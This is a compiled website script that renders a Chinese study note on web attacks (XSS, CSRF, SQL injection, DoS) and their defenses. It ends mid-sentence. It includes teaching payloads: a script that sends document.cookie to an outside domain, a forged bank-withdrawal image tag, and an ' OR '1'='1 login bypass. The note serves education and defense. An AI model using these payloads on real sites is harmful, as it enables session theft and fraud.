(window.webpackJsonp=window.webpackJsonp||[]).push([[39],{357:function(s,t,a){"use strict";a.r(t);var r=a(7),n=Object(r.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"_31-网络安全"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_31-网络安全"}},[s._v("#")]),s._v(" 31.网络安全")]),s._v(" "),t("h4",{attrs:{id:"网络攻击技术🌟"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#网络攻击技术🌟"}},[s._v("#")]),s._v(" 网络攻击技术🌟")]),s._v(" "),t("p",[s._v("总结一下常见的 Web 攻击方法.")]),s._v(" "),t("ul",[t("li",[t("strong",[s._v("XSS 攻击")]),s._v(": 关键是脚本, 利用恶意脚本发起攻击.")]),s._v(" "),t("li",[t("strong",[s._v("CSRF 攻击")]),s._v(": 关键是借助本地 Cookie 进行认证, 伪造发送请求.")]),s._v(" "),t("li",[t("strong",[s._v("SQL 注入")]),s._v(": 关键是通过用 SQL 语句伪造参数发出攻击.")]),s._v(" "),t("li",[t("strong",[s._v("DDOS 攻击")]),s._v(": 关键是发出大量请求, 最后令服务器崩溃.")])]),s._v(" "),t("h5",{attrs:{id:"_1-跨站脚本攻击xss"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-跨站脚本攻击xss"}},[s._v("#")]),s._v(" 1.跨站脚本攻击XSS")]),s._v(" "),t("h6",{attrs:{id:"_1-概念"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-概念"}},[s._v("#")]),s._v(" (1)概念")]),s._v(" "),t("p",[s._v("跨站脚本攻击(Cross-Site Scripting, XSS) "),t("strong",[s._v("指攻击者向用户请求的 HTML 页面中插入恶意脚本, 从而可以执行任意脚本")]),s._v(". XSS 可以将"),t("strong",[s._v("代码")]),s._v("(包括 HTML 和 JS 代码) 注入到"),t("strong",[s._v("用户浏览的网页")]),s._v("上, 达到如盗取用户的 "),t("strong",[s._v("cookie")]),s._v(", 改变网页的 DOM 结构, 重定向到其他网页等攻击的目的.")]),s._v(" "),t("p",[s._v("主要分为: 反射型 XSS, 存储型 XSS, DOM 型 XSS.")]),s._v(" "),t("p",[t("strong",[s._v("危害")]),s._v(": 窃取用户的 Cookie, 伪造虚假的输入表单骗取个人信息, 显示伪造的文章或图片等.")]),s._v(" "),t("h6",{attrs:{id:"_2-攻击原理"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-攻击原理"}},[s._v("#")]),s._v(" (2)攻击原理")]),s._v(" "),t("p",[s._v("例如有一个"),t("strong",[s._v("论坛网站")]),s._v(", 攻击者可以在上面发布以下内容:")]),s._v(" "),t("div",{staticClass:"language-html line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-html"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),t("span",{pre:!0,attrs:{class:"token script"}},[t("span",{pre:!0,attrs:{class:"token language-javascript"}},[s._v("location"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("href"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//domain.com/?c="')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie")])]),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("被攻击之后该内容可能会被"),t("strong",[s._v("渲染")]),s._v("成以下形式:")]),s._v(" "),t("div",{staticClass:"language-html line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-html"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("p")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),t("span",{pre:!0,attrs:{class:"token script"}},[t("span",{pre:!0,attrs:{class:"token language-javascript"}},[s._v("location"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("href"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"//domain.com/?c="')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie")])]),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("p")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带"),t("strong",[s._v("当前作用域的 Cookie")]),s._v(". 如果这个论坛网站通过 Cookie 管理用户登录状态, 那么攻击者就可以通过这个 Cookie 登录被攻击者的账号.")]),s._v(" "),t("h6",{attrs:{id:"_3-攻击分类举例"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-攻击分类举例"}},[s._v("#")]),s._v(" (3)攻击分类举例")]),s._v(" "),t("blockquote",[t("p",[s._v("反射型XSS")])]),s._v(" "),t("p",[s._v("又称非持久性跨站点脚本攻击, 是最常见的 XSS 类型. 产生原因是攻击者注入的数据反映在响应中. 一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接, 即每次攻击需要用户的点击.")]),s._v(" "),t("p",[t("strong",[s._v("简单例子")]),s._v(": 正常发送如下消息, 接收者将会接收信息并显示 Hello,Word.")]),s._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("http")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("//www.test.com/message.php?send=Hello,World")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("非正常发送如下消息, 接收者接收消息显示的时候将会弹出警告窗口.")]),s._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("http")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("//www.test.com/message.php?send=<script>alert(‘foolish!’)<\/script>")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("blockquote",[t("p",[s._v("持久型XSS")])]),s._v(" "),t("p",[s._v("又称为持久型跨站点脚本, 攻击代码一般存储在服务器的数据库中, 当一个页面被用户打开的时候执行. 这通常危害性更大, 因为每当用户打开页面查看内容时脚本就会自动执行.")]),s._v(" "),t("p",[s._v("**简单例子: ** 例如留言板表单中的表单域.")]),s._v(" "),t("div",{staticClass:"language-xml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-xml"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("input")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("type")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("text"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("name")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("content"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),s._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("value")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("这里是用户填写的数据"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("正常操作: 用户是提交相应留言信息; 将数据存储到数据库; 其他用户访问留言板, 应用取数据并显示.")]),s._v(" "),t("p",[s._v("非正常操作: 攻击者在 value 填写如下攻击代码并被存储到数据库中; 其他用户取出数据显示的时候, 将会执行这些攻击性代码.")]),s._v(" "),t("div",{staticClass:"language-xml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-xml"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("alert('foolish!')"),t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("</")]),s._v("script")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v(" [或者 HTML 其他标签, 一段攻击型代码等]\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("blockquote",[t("p",[s._v("DOM型XSS")])]),s._v(" "),t("p",[s._v("基于 DOM 的 XSS, 通过对具体 DOM 代码进行分析, 根据实际情况"),t("strong",[s._v("构造 dom 节点")]),s._v("进行 XSS 跨站脚本攻击.")]),s._v(" "),t("h6",{attrs:{id:"_4-防范手段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-防范手段"}},[s._v("#")]),s._v(" (4)防范手段")]),s._v(" "),t("p",[s._v('至理名言: "'),t("strong",[s._v("所有用户输入都是不可信的")]),s._v('". '),t("strong",[s._v("坚决不要相信用户的任何输入")]),s._v(", 注意"),t("strong",[s._v("过滤")]),s._v("掉输入中的所有特殊字符, 这样就能防范大部分 XSS 攻击.")]),s._v(" "),t("p",[t("strong",[s._v("I 设置 Cookie 为 HttpOnly")])]),s._v(" "),t("p",[s._v("设置了 HttpOnly 的 Cookie 可以"),t("strong",[s._v("防止 JavaScript 脚本")]),s._v("调用, 就无法通过 document.cookie 获取用户 Cookie 信息.")]),s._v(" "),t("p",[t("strong",[s._v("II 过滤或转义用户输入数据")])]),s._v(" "),t("p",[s._v("例如将 "),t("code",[s._v("<")]),s._v("​ 转义为 "),t("code",[s._v("&lt;")]),s._v("​, 将 "),t("code",[s._v(">")]),s._v("​ 转义为 "),t("code",[s._v("&gt;")]),s._v("​, 从而避免 HTML 和 JavaScript 代码的运行. 可以使用 Jsoup 框架对用户输入字符串做 "),t("strong",[s._v("XSS 过滤")]),s._v(".")]),s._v(" "),t("h5",{attrs:{id:"_2-跨站请求伪造csrf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-跨站请求伪造csrf"}},[s._v("#")]),s._v(" 2.跨站请求伪造CSRF")]),s._v(" "),t("h6",{attrs:{id:"_1-概念-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-概念-2"}},[s._v("#")]),s._v(" (1)概念")]),s._v(" "),t("p",[s._v("跨站请求伪造(Cross-site request forgery, CSRF), 是攻击者通过一些技术手段欺骗用户去"),t("strong",[s._v("访问一个自己曾经认证过的网站")]),s._v("并执行一些操作, 如发邮件, 甚至转账等. 由于浏览器"),t("strong",[s._v("曾经认证")]),s._v("过, 所以被访问的网站会认为是"),t("strong",[s._v("真正")]),s._v("的用户操作而去执行.")]),s._v(" "),t("p",[s._v("大致流程: 用户登录并浏览受信任网站, 受信网站服务器响应并生成用户的 "),t("strong",[s._v("Cookie")]),s._v(", 如果此时用户在未注销受信网站的情况下去访问恶意网站. 恶意网站就会"),t("strong",[s._v("利用 cookie")]),s._v(" 向正常网站发起请求, 而正常网站服务器会接受来自恶意网站的请求.")]),s._v(" "),t("p",[s._v("这种"),t("strong",[s._v("恶意网址")]),s._v("可以有很多种形式, 例如可以将这种地址藏在论坛, 博客等任何用户生成内容的网站中. 这意味着如果服务器端没有合适的防御措施的话, 用户即使访问熟悉的可信网站也有受攻击的危险.")]),s._v(" "),t("h6",{attrs:{id:"_2-攻击原理-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-攻击原理-2"}},[s._v("#")]),s._v(" (2)攻击原理")]),s._v(" "),t("p",[s._v("假如一家银行用以"),t("strong",[s._v("执行转账")]),s._v("操作的 URL 地址如下:")]),s._v(" "),t("div",{staticClass:"language-http line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-http"}},[t("code",[t("span",{pre:!0,attrs:{class:"token header"}},[t("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("http")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),t("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("//www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("比如一个用户"),t("strong",[s._v("登录")]),s._v("了银行的网站(已经有了 cookie), 这个网站的评论区中有人发了一个学习炒股的超链接, 这个人点了之后, 这个链接可能执行:")]),s._v(" "),t("div",{staticClass:"language-html line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-html"}},[t("code",[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token tag"}},[t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("<")]),s._v("img")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token attr-name"}},[s._v("src")]),t("span",{pre:!0,attrs:{class:"token attr-value"}},[t("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')]),s._v("http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v('"')])]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(">")])]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("这就可能造成用户损失 1000 美元.")]),s._v(" "),t("p",[s._v("可以看出攻击者并"),t("strong",[s._v("不能通过 CSRF 攻击来直接获取用户的账户控制权")]),s._v(", 也不能直接窃取用户的任何信息. 攻击者能做到的就是欺骗用户浏览器, 让其以用户的名义执行操作.")]),s._v(" "),t("h6",{attrs:{id:"_3-防范手段"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-防范手段"}},[s._v("#")]),s._v(" (3)防范手段")]),s._v(" "),t("p",[t("strong",[s._v("I 使用 Token 验证")])]),s._v(" "),t("p",[s._v("在访问敏感数据请求时, 要求用户浏览器提供"),t("strong",[s._v("不保存在 Cookie 中, 并且攻击者无法伪造")]),s._v("的数据作为校验. 例如服务器生成随机数并附加在表单中, 并要求客户端传回这个随机数. 所以可以"),t("strong",[s._v("采用 token 认证")]),s._v(".")]),s._v(" "),t("p",[t("strong",[s._v("II 人机交互")])]),s._v(" "),t("p",[s._v("配合"),t("strong",[s._v("验证码")]),s._v("进行验证. 因为 CSRF 攻击是在用户无意识的情况下发生的, 所以要求用户"),t("strong",[s._v("输入验证码")]),s._v("可以让用户知道自己正在做的操作, 所以银行转账这些一般都会有短信验证码.")]),s._v(" "),t("p",[t("strong",[s._v("III 检查 Referer 首部字段")])]),s._v(" "),t("p",[t("strong",[s._v("Referer 首部字段")]),s._v("位于 HTTP 报文中, 用于"),t("strong",[s._v("标识请求来源")]),s._v("的地址. 检查这个"),t("strong",[s._v("首部字段")]),s._v("并要求"),t("strong",[s._v("请求来源")]),s._v("的地址在"),t("strong",[s._v("同一个域名")]),s._v("下, 可以极大的防止 CSRF 攻击. Referer 指的是页面请求来源. 意思是只接受本站的请求, 服务器才做响应; 如果不是就拦截.")]),s._v(" "),t("p",[s._v("这种办法简单易行, 工作量低, 仅需要在关键访问处增加一步校验. 但也有其局限性, 因其完全依赖浏览器发送正确的 Referer 字段. 虽然 HTTP 协议对此字段的内容有明确规定, 但无法保证来访浏览器的具体实现, 亦无法保证浏览器没有安全漏洞影响到此字段. 并且也存在攻击者攻击某些浏览器, 篡改其 Referer 字段的可能.")]),s._v(" "),t("h6",{attrs:{id:"_4-xss与csrf区别"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-xss与csrf区别"}},[s._v("#")]),s._v(" (4)XSS与CSRF区别")]),s._v(" "),t("p",[t("strong",[s._v("XSS 是在正常用户请求的 HTML 页面中执行黑客植入的恶意代码, CSRF 是黑客直接盗用用户浏览器中的登录信息, 冒充用户去执行黑客的操作.")])]),s._v(" "),t("p",[t("strong",[s._v("XSS 的问题出在用户数据没有过滤或者转义; CSRF 的问题出在 HTTP 接口没有防范不受信任的调用.")])]),s._v(" "),t("h5",{attrs:{id:"_3-sql注入攻击"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-sql注入攻击"}},[s._v("#")]),s._v(" 3.SQL注入攻击")]),s._v(" "),t("h6",{attrs:{id:"_1-概念-3"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-概念-3"}},[s._v("#")]),s._v(" (1)概念")]),s._v(" "),t("p",[t("strong",[s._v("SQL 注入攻击是未将代码与数据进行严格隔离, 导致在读取用户数据的时候, 错误的把数据作为代码的一部分执行, 从而导致安全问题.")])]),s._v(" "),t("h6",{attrs:{id:"_2-攻击原理-3"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-攻击原理-3"}},[s._v("#")]),s._v(" (2)攻击原理")]),s._v(" "),t("p",[s._v("例如一个网站登录验证的 SQL 查询代码为:")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("strSQL "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SELECT * FROM users WHERE (name = \'"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" userName "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"') and (pw = '\"")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" passWord "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"\');"')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("如果填入以下内容:")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("userName "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"1' OR '1'='1\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\npassWord "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"1' OR '1'='1\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("那么 SQL 查询字符串为:")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("strSQL "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');\"")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("此时无需验证通过就能执行以下查询:")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("strSQL "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SELECT * FROM users;"')]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h6",{attrs:{id:"_3-防范手段-2"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-防范手段-2"}},[s._v("#")]),s._v(" (3)防范手段")]),s._v(" "),t("p",[t("strong",[s._v("I 合理使用框架, 使用预编译语句")])]),s._v(" "),t("p",[s._v("Java 中 "),t("strong",[s._v("PreparedStatement")]),s._v(" 是"),t("strong",[s._v("预编译")]),s._v("的 SQL 语句, 可以传入适当参数并且多次执行. 由于没有拼接的过程, 因此可以防止 SQL 注入. 绑定变量使用预编译语句是预防 SQL 注入的最佳方式, 使用预编译的 SQL 语句语义不会发生改变.")]),s._v(" "),t("div",{staticClass:"language-java line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-java"}},[t("code",[t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("PreparedStatement")]),s._v(" stmt "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" connection"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("prepareStatement")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SELECT * FROM users WHERE userid=? AND password=?"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nstmt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("setString")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" userid"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\nstmt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("setString")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" password"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ResultSet")]),s._v(" rs "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" stmt"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("executeQuery")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("MyBatis 中的  "),t("strong",[s._v("#{} 绑定参数")]),s._v("也能防止 SQL 注入.")]),s._v(" "),t("p",[t("strong",[s._v("II 输入过滤")])]),s._v(" "),t("p",[s._v("过滤用户输入参数中的特殊字符.")]),s._v(" "),t("h5",{attrs:{id:"_4-拒绝服务攻击dos"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_4-拒绝服务攻击dos"}},[s._v("#")]),s._v(" 4.拒绝服务攻击DOS")]),s._v(" "),t("h6",{attrs:{id:"_1-概念-4"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_1-概念-4"}},[s._v("#")]),s._v(" (1)概念")]),s._v(" "),t("p",[s._v("拒绝服务攻击(Denial-of-Service Attack, DoS), 其目的在于使目标服务器的网络或系统资源耗尽, 使服务暂时中断或停止, 导致其正常用户无法访问. 此外还有"),t("strong",[s._v("分布式拒绝服务攻击")]),s._v("(Distributed Denial-of-Service Attack, DDoS).")]),s._v(" "),t("h6",{attrs:{id:"_2-攻击方法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_2-攻击方法"}},[s._v("#")]),s._v(" (2)攻击方法")]),s._v(" "),t("p",[s._v("典型的 DOS 攻击方式如下:")]),s._v(" "),t("ul",[t("li",[t("strong",[s._v("SYN Flood")]),s._v(": 这是一种利用 "),t("strong",[s._v("TCP 协议")]),s._v("缺陷, 发送大量伪造 "),t("strong",[s._v("TCP 连接请求")]),s._v(", 使得被攻击方资源耗尽的攻击方式. TCP 三次握手时, 客户端服务器发出请求以建立连接, 然后服务器返回一个报文, 表明请求以被接受, 然后客户端也会返回一个报文, 最后建立连接. 如果攻击者伪造 IP 地址并发出请求连接, 服务器收到连接请求后也要回应一个报文, 可是这个 "),t("strong",[s._v("IP 是伪造的")]),s._v(", 报文无法回应, "),t("strong",[s._v("第二次握手出现错误")]),s._v(", 这时服务器收不到第三次握手时客户端发出的报文, 又再"),t("strong",[s._v("重复第二次握手")]),s._v("的操作. 如果攻击者伪造了大量 IP 地址并发出请求, 那么服务器将维护一个非常大的"),t("strong",[s._v("半连接")]),s._v("等待列表, 这会占用大量资源甚至导致服务器瘫痪.")]),s._v(" "),t("li",[t("strong",[s._v("CC 攻击")]),s._v(": CC 攻击是目前应用层攻击的主要手段之一, 借助代理服务器生成指向目标系统的合法请求, 实现伪装和 DDoS. CC 攻击就模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面, 造成服务器资源的浪费, CPU 耗用高, 请求处理不完, 网络拥塞, 正常访问被中止.")])]),s._v(" "),t("h6",{attrs:{id:"_3-防范手段-3"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#_3-防范手段-3"}},[s._v("#")]),s._v(" (3)防范手段")]),s._v(" "),t("p",[s._v("没有根治的办法, 除非不用 TCP/IP 链接.")]),s._v(" "),t("ul",[t("li",[s._v("确保服务器的系统文件是最新版本, 并及时更新系统补丁.")]),s._v(" "),t("li",[s._v("正确设置防火墙. 关闭不必要的服务, 禁止对主机的非开放服务的访问, 运行端口映射程序祸端口扫描程序, 要认真检查特权端口和非特权端口, 启用防火墙的防 DDos 的属性.")]),s._v(" "),t("li",[s._v("限制同时打开 "),t("strong",[s._v("SYN 的半连接")]),s._v("数目, 缩短 SYN 半连接的 Time Out 时间.")]),s._v(" "),t("li",[s._v("限制特定 IP 短地址的访问.")])]),s._v(" "),t("p",[s._v("阿里巴巴的安全团队提出 DDoS 